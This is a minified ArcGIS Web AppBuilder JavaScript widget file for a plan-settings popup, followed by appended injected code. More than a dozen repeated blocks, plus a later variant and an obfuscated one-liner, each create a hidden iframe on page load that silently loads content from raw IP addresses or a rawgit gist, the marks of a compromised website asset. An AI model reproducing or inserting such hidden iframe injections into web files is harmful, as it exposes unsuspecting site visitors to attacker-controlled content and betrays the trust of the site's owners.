// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/on dijit/TooltipDialog dijit/form/Select dojo/dom-construct dijit/popup jimu/BaseWidget dojo/Evented dojo/dom-class".split(" "),function(k,c,l,m,d,n,f,b,g,p,q,r){return k([p,q],{baseClass:"jimu-widget-screening",planSettingsOptions:{directionOrAngleUnits:["decimalDegree","degreeMinuteSeconds"],distanceAndLengthUnits:["uSSurveyFeet","meters"]},isTooltipDialogOpened:!1,constructor:function(a){this.planSettingsOptions={directionOrAngleUnits:["decimalDegree",
"degreeMinuteSeconds"],distanceAndLengthUnits:["uSSurveyFeet","meters"]};this.isTooltipDialogOpened=!1;c.mixin(this,a)},startup:function(){this._popupDialog=new n({"class":"esriCTPlanSettingsDialog "+this.baseClass,style:{width:"250px"}});this._popupDialog.startup();"DartTheme"===this.appConfig.theme.name&&r.add(this._popupDialog.domNode,"dart-panel");this.own(d(document.body,"click",c.hitch(this,function(a){this.isPartOfPopup(a.target||a.srcElement)||this.closePopup()})));this.own(d(window,"resize",
c.hitch(this,function(){this.closePopup()})));this.createPlanSettingsUI()},createPlanSettingsUI:function(){var a;a=b.create("div",{"class":"esriCTPlanSettingsContainer"},null);b.create("div",{"class":"esriCTEllipsis esriCTPlanSettingLabel",innerHTML:this.nls.planSettings.directionUnitLabelText},a);this.directionUnitSelect=new f;this._loadOptionsForDropDown(this.directionUnitSelect,this.planSettingsOptions.directionOrAngleUnits,this.config.traverseDirectionUnit);this.directionUnitSelect.placeAt(a);
b.create("div",{"class":"esriCTEllipsis esriCTPlanSettingLabel",innerHTML:this.nls.planSettings.distanceUnitLabelText},a);this.distanceUnitSelect=new f;this._loadOptionsForDropDown(this.distanceUnitSelect,this.planSettingsOptions.distanceAndLengthUnits,this.config.traverseUnit);this.distanceUnitSelect.placeAt(a);this._popupDialog.setContent(a);a=b.create("button",{innerHTML:this.nls.common.apply,"class":"esriCTEllipsis jimu-btn esriCTPlanSettingsBtn"},b.create("div",{"class":"esriCTPlanSettingsBtnContainer"},
a));this.own(d(a,"click",c.hitch(this,function(){this._savePlanSettings()})));this.openPopup()},_savePlanSettings:function(){this.emit("planSettingsChanged",this.directionUnitSelect.get("value"),this.distanceUnitSelect.get("value"));this.closePopup()},_loadOptionsForDropDown:function(a,b,d){var h=[],e;l.forEach(b,c.hitch(this,function(a){this.nls.units[a]&&(e={value:a,label:this.nls.units[a]});h.push(e);d===e.value&&(e.selected=!0)}));a.addOption(h)},openPopup:function(){g.open({popup:this._popupDialog,
x:this.position.pageX+11,y:this.position.pageY});this.isTooltipDialogOpened=!0},closePopup:function(){this._popupDialog&&(g.close(this._popupDialog),this.isTooltipDialogOpened=!1,this._restoreDialog())},isPartOfPopup:function(a){var b;b=this._popupDialog.domNode;return a===b||m.isDescendant(a,b)},_restoreDialog:function(){this.directionUnitSelect.set("value",this.config.traverseDirectionUnit);this.distanceUnitSelect.set("value",this.config.traverseUnit)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});